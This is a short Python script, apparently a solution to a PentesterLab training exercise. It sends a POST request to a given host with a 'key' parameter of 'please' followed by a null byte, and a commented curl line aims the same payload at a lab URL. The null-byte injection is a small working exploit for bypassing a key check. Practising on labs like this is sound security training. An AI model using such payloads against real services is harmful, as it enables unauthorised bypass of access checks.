#curl 'http://ptl-23deb8a2-468d8f2a.libcurl.so/pentesterlab?key=please%00'

import requests
import sys
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("host", help="enter a domain or IP address")
args = parser.parse_args()


host = sys.argv[1]

params = {'key':"please" + '\x00'}
#data = {'key':"please"}

response = requests.post(host, params=params)

print(response.text)